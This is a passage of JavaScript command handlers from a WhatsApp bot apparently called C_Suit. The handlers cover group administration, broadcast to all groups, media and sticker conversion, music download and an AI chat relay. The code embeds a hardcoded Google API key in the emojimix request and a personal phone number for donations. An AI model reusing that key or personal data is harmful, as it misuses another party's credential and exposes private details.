                if (!isCreator) return replyCsuit(mess.owner)
                if (!quoted) return replyCsuit(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyCsuit(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyCsuit(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await LostBoyTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: botNumber,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyCsuit(mess.done)
                } else {
                    var memeg = await LostBoyTechInc.updateProfilePicture(botNumber, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyCsuit(mess.done)
                }
                break
            case 'block':
                if (!isCreator) return replyCsuit(mess.owner)
                let blockw = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await LostBoyTechInc.updateBlockStatus(blockw, 'block').then((res) => replyCsuit(json(res))).catch((err) => replyCsuit(json(err)))
                break
            case 'unblock':
                if (!isCreator) return replyCsuit(mess.owner)
                let blockww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await LostBoyTechInc.updateBlockStatus(blockww, 'unblock').then((res) => replyCsuit(json(res))).catch((err) => replyCsuit(json(err)))
                break
            case 'leave':
                if (!isCreator) return replyCsuit(mess.owner)
                if (!m.isGroup) return replyCsuit(mess.group)
                replyCsuit('Bye Everyone 🥺')
                await LostBoyTechInc.groupLeave(m.chat)
                break
            case 'backup':
                if (!isCreator) return replyCsuit(mess.owner)
                if (m.isGroup) return replyCsuit(mess.private)
                replyCsuit(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await LostBoyTechInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: m
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replyCsuit(mess.owner)
                if (!text) return replyCsuit(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await LostBoyTechInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let xmenu_oh = groups.map(v => v.id)
                replyCsuit(`Send Broadcast To ${xmenu_oh.length} Group Chat, End Time ${xmenu_oh.length * 1.5} second`)
                for (let i of xmenu_oh) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    LostBoyTechInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: '> 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 𝙱𝚈 𝙲𝚂𝚄𝙸𝚃',
                                body: `𝚂𝙴𝙽𝚃 ${i.length} 𝙶𝚁𝙾𝚄𝙿`,
                                thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyCsuit(`> 𝙱𝚁𝙾𝙰𝙳𝙲𝙰𝚂𝚃 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝚂𝙴𝙽𝚃 ${xmenu_oh.length} 𝙶𝚁𝙾𝚄𝙿😁`)
            }
            break
            
            case 'delete':
            case 'del': {
                if (!isCreator) return replyCsuit(mess.done)
                if (!m.quoted) throw false
                let {
                    chat,
                    fromMe,
                    id,
                    isBaileys
                } = m.quoted
                if (!isBaileys) return replyCsuit('The message was not sent by a bot!')
                LostBoyTechInc.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: true,
                        id: m.quoted.id,
                        participant: m.quoted.sender
                    }
                })
            }
            break

case 'music': {
    await loading()
    try {
        if (!text) return replyCsuit(`🎵 *Example:* ${prefix + command} Born in hell`);
        
        // Notify the user of processing

        // Perform a search using yts
        const yts = require("yt-search");
        let search = await yts(text);

        if (!search || search.videos.length === 0) {
            return replyCsuit('❌ *No video found.* Please try with a different keyword.');
        }

        // Get the first video from the search results
        let video = search.videos[0];

        // Extract video details
        let { title, thumbnail, videoId } = video;
        const url = 'https://www.youtube.com/watch?v=' + videoId;

        // Use the new API to fetch the audio details
        const apiUrl = `https://api.davidcyriltech.my.id/spotifydl?url=${encodeURIComponent(url)}`;
        const response = await axios.get(apiUrl);

        if (!response.data || !response.data.status || !response.data.data || !response.data.data.dl) {
            return replyCsuit('🚫 *Error fetching audio from the URL.* Please try again later.');
        }

        // Extract details from the API response
        const { dl } = response.data.data;

        // Prepare the audio message
        const audioDetails = {
            audio: { url: dl },
            mimetype: 'audio/mpeg', // Correct MIME type for MP3 audio
            fileName: `${title}.mp3`, // Set the file name
            ptt: true, // Send as a press-to-talk (PTT) message
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: url,
                    title: title,
                    body: 'CSUIT', // You can customize this to something like "Today"
                    sourceUrl: url,
                    thumbnail: await (await fetch(thumbnail)).buffer() // Fetch and send the thumbnail image
                }
            }
        };

        // Send the audio message with context and the thumbnail
        await LostBoyTechInc.sendMessage(m.chat, audioDetails, { quoted: m });

    } catch (error) {
        console.error("Error in play command:", error);
        replyCsuit("⚠️ *An error occurred while processing your request.* Please try again or try song, music, Spotify, spdl.");
    }
}
break

case 'lostboyai': {
    if (!text) return replyCsuit(`*• Example:* ${prefix + command} Who is LostBoy`);

    await LostBoyTechInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    try {
        let responseText;

        // Custom response for "Who is LostBoy?"
        if (/who is lostboy/i.test(text)) {
            responseText = "LostBoy is my Developer. He is 14 years of age, open-minded, and sensible. Very friendly and playful!";
        } else {
            // Fetch AI response from the API
            let gpt = await (await fetch(`https://api.davidcyriltech.my.id/ai/chatbot?query=${encodeURIComponent(text)}`)).json();

            if (!gpt.result) {
                return replyCsuit("Failed to fetch AI response. Please try again later.");
            }

            responseText = gpt.result;
        }

        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: '> LostBoy - AI\n\n' + responseText
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: global.botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: false,
                            ...await prepareWAMessageMedia({ 
                                image: fs.readFileSync('./C-SMedia/menu3.jpg') 
                            }, { upload: LostBoyTechInc.waUploadToServer })  
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_replyCsuit",
                                "buttonParamsJson": `{"display_text":"Nice LostBoyTech - AI","id":".mangap"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '0@newsletter',
                                newsletterName: global.botname,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        await LostBoyTechInc.relayMessage(m.chat, msgs.message, {});
    } catch (e) {
        console.error("AI Chatbot Error:", e);
        return replyCsuit("An error occurred while processing your request. Please try again.");
    }
}
break;
            case 'closetime':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                if (args[1] == 'detik') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'menit') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'jam') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'hari') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyCsuit('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyCsuit(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Closed* group closed by admin\nnow only admin can send messages`
                    LostBoyTechInc.groupSettingUpdate(m.chat, 'announcement')
                    replyCsuit(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replyCsuit('*Choose:*\nsecond\nminute\nhour\nday\n\n*Example*\n10 second')
                }
                replyCsuit(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Opened* The group is opened by admin\nNow members can send messages`
                    LostBoyTechInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replyCsuit(open)
                }, timer)
                break
            case 'kick':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await LostBoyTechInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove').then((res) => replyCsuit(json(res))).catch((err) => replyCsuit(json(err)))
                break
            case 'add':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await LostBoyTechInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add').then((res) => replyCsuit(json(res))).catch((err) => replyCsuit(json(err)))
                break
            case 'promote': {
if (!isCreator) return replyCsuit('*Only Premium Members Are Allowed To Use This Command*')
if (!m.isGroup) return replyCsuit('Create In Stupid Group ')
if (!isBotAdmins) return replyCsuit('Bots are not admins, dude ')
if (!isAdmins) return replyCsuit('I thought you were the group admin ')
await loading()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await LostBoyTechInc.groupParticipantsUpdate(from, [users], 'promote')
}
break
            case 'demote':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await LostBoyTechInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote').then((res) => replyCsuit(json(res))).catch((err) => replyCsuit(json(err)))
                break
            case 'setname':
            case 'setsubject':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                if (!text) return 'Text ?'
                await LostBoyTechInc.groupUpdateSubject(m.chat, text).then((res) => replyCsuit(mess.success)).catch((err) => replyCsuit(json(err)))
                break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                if (!text) return 'Text ?'
                await LostBoyTechInc.groupUpdateDescription(m.chat, text).then((res) => replyCsuit(mess.success)).catch((err) => replyCsuit(json(err)))
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                if (!quoted) return replyCsuit(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replyCsuit(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replyCsuit(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await LostBoyTechInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replyCsuit(mess.done)
                } else {
                    var memeg = await LostBoyTechInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replyCsuit(mess.done)
                }
                break
            case 'tagall':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyCsuit(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyCsuit(mess.botAdmin)
                let teks = `*👥 Tag All*
 
                 🗞️ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                    teks += `• @${mem.id.split('@')[0]}\n`
                }
                LostBoyTechInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'hidetag':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return replyCsuit(mess.admin)
                if (!isBotAdmins && !isCreator && !isPremium) return replyCsuit(mess.botAdmin)
                LostBoyTechInc.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isBotAdmins && !isCreator && !isPremium) return replyCsuit(mess.botAdmin)
                if (!isAdmins && !isCreator && !isPremium) return replyCsuit(mess.admin)
                if (!m.quoted) return replyCsuit(`Reply messages with captions ${prefix + command}`)
                LostBoyTechInc.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                if (args[0] === 'close') {
                    await LostBoyTechInc.groupSettingUpdate(m.chat, 'announcement').then((res) => replyCsuit(`Success In Closing The Group 🕊️`)).catch((err) => replyCsuit(json(err)))
                } else if (args[0] === 'open') {
                    await LostBoyTechInc.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replyCsuit(`Success In Opening The Group 🕊️`)).catch((err) => replyCsuit(json(err)))
                } else {
                    replyCsuit(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                if (args[0] === 'open') {
                    await LostBoyTechInc.groupSettingUpdate(m.chat, 'unlocked').then((res) => replyCsuit(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => replyCsuit(json(err)))
                } else if (args[0] === 'close') {
                    await LostBoyTechInc.groupSettingUpdate(m.chat, 'locked').then((res) => replyCsuit(`Successfully Closed Group Edit Info🕊️`)).catch((err) => replyCsuit(json(err)))
                } else {
                    replyCsuit(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                let response = await LostBoyTechInc.groupInviteCode(m.chat)
                LostBoyTechInc.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return replyCsuit(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return replyCsuit(mess.admin)
                if (!isBotAdmins) return replyCsuit(mess.botAdmin)
                await LostBoyTechInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyCsuit(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => replyCsuit(json(err)))
                break
                case 'p':
            case 'ping': {
await loading();
  const startTime = new Date();
  const pingMsg = await LostBoyTechInc.sendMessage(m.chat, { 
    text: '🔄 *CSUIT* 🔄\n\n🕒 *Checking Speed...*' 
  });

  // Delay before editing the message
  setTimeout(async () => {
    await LostBoyTechInc.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `
━━━━━━━━━━━━━━━━━━━━━
⚡ *CSUIT SPEED* ⚡
📶 *Response Time:* 
${new Date() - startTime} 𝙼𝚂
━━━━━━━━━━━━━━━━━━━━━
🚀 *Optimized for Speed!*

> C SUIT
          `.trim()
        }
      }
    }, {});
  }, 1000); // 1000 ms delay (1 second)
}
break;
                
            case 'buypremium':
            case 'buyprem':
            case 'premium': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium? Just chat with the owner😉`
                await LostBoyTechInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `${ownername}`,
                            thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'runtime':
                let runtimetext = `Bots Have Been Running For ${runtime(process.uptime())}`
                LostBoyTechInc.sendMessage(m.chat, {
                    text: runtimetext,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `FORGET DONATE`,
                            thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                LostBoyTechInc.sendMessage(m.chat, {
                    text: `🫂https://github.com/LOSTBOY1-TCH/C_Suit_v3`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} ASK LOST BOY OR LORD TECH`,
                            thumbnailUrl: 'https://files.catbox.moe/l1srou.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            case 'donate':
            case 'donasi':
                let textnate = `Hello Brother ${pushname}\n\nNo matter how much you donate is very valuable for us`
                LostBoyTechInc.sendMessage(m.chat, {
                    text: '233549551004 momo\n\n' + textnate
                }, {
                    quoted: m
                })
                break
case 'owner': {
const repf = await LostBoyTechInc.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Contact`, 
contacts: list }, mentions: [sender] }, { quoted: m })
LostBoyTechInc.sendMessage(from, { text : `Hi @${sender.split("@")[0]}, Here is my handsome owner😇`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
            case 's': {
                if (!quoted) return replyCsuit(`Reply to Video/Image With Caption ${prefix + command}`)
                if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await LostBoyTechInc.sendImageAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else if (isVideo || /video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replyCsuit('Maximum 10 seconds!')
                    let media = await quoted.download()
                    let encmedia = await LostBoyTechInc.sendVideoAsSticker(m.chat, media, m, {
                        packname: packname,
                        author: author
                    })
                    await fs.unlinkSync(encmedia)
                } else {
                    return replyCsuit(`Send Images/Videos With Captions ${prefix + command}\nVideo Duration 1-9 Seconds`)
                }
            }
            break
            case 'smeme': {
                let respond = `Send/Reply image/sticker with caption ${prefix + command} text1|text2`
                if (!/image/.test(mime)) return replyCsuit(respond)
                if (!text) return replyCsuit(respond)
                replyCsuit(mess.wait)
                atas = text.split('|')[0] ? text.split('|')[0] : '-'
                bawah = text.split('|')[1] ? text.split('|')[1] : '-'
                let dwnld = await LostBoyTechInc.downloadAndSaveMediaMessage(qmsg)
                let fatGans = await TelegraPh(dwnld)
                let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
                let pop = await LostBoyTechInc.sendImageAsSticker(m.chat, smeme, m, {
                    packname: packname,
                    author: author
                })
                fs.unlinkSync(pop)
            }
            break
case 'swm': case 'steal': case 'stickerwm': case 'xmenu_ohe':{
if (!args.join(" ")) return replyCsuit(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
LostBoyTechInc.downloadAndSaveMediaMessage(quoted, "gifee")
LostBoyTechInc.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await LostBoyTechInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replyCsuit('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await LostBoyTechInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replyCsuit(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replyCsuit(`Reply sticker with caption *${prefix + command}*`)
                replyCsuit(mess.wait)
                let media = await LostBoyTechInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    LostBoyTechInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replyCsuit(`Reply sticker with caption *${prefix + command}*`)
                replyCsuit(mess.wait)
                let media = await LostBoyTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await LostBoyTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyCsuit(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                replyCsuit(mess.wait)
                let media = await LostBoyTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                LostBoyTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyCsuit(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                replyCsuit(mess.wait)
                let media = await LostBoyTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                LostBoyTechInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `11.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replyCsuit(`Reply Video/Audio that you want to make into a VN with caption ${prefix + command}`)
                replyCsuit(mess.wait)
                let media = await LostBoyTechInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                LostBoyTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replyCsuit(`Reply sticker with caption *${prefix + command}*`)
                replyCsuit(mess.wait)
                let media = await LostBoyTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await LostBoyTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break

            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replyCsuit(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replyCsuit(`Example : ${prefix + command} 😅+🤔`)
                replyCsuit(mess.wait)
                let xmenu_oh = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of xmenu_oh.results) {
                    let encmedia = await LostBoyTechInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replyCsuit(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    xmenu_ohan = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
                    LostBoyTechInc.sendMessage(m.chat, {
                        image: {
                            url: xmenu_ohan
                        },
                        caption: `Here you go!`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    xmenu_ohxmenu_ohan = await LostBoyTechInc.downloadAndSaveMediaMessage(quoted)
                    LostBoyTechInc.sendMessage(m.chat, {
                        video: {
                            url: xmenu_ohxmenu_ohan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return replyCsuit(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await LostBoyTechInc.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replyCsuit(`Example:\n${prefix}fliptext Xeony`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replyCsuit(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of VoiceNoteXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VoiceNoteXeon.length}*`
                replyCsuit(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of StickerXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${StickerXeon.length}*`
                replyCsuit(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of ImageCsuit) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${ImageCsuit.length}*`
                replyCsuit(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of VideoXeon) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${VideoXeon.length}*`
                replyCsuit(teks)
            }
            break
            case 'addowner':
                if (!isCreator) return replyCsuit(mess.owner)
if (!args[0]) return replyCsuit(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await LostBoyTechInc.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyCsuit(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(owner))
replyCsuit(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return replyCsuit(mess.owner)
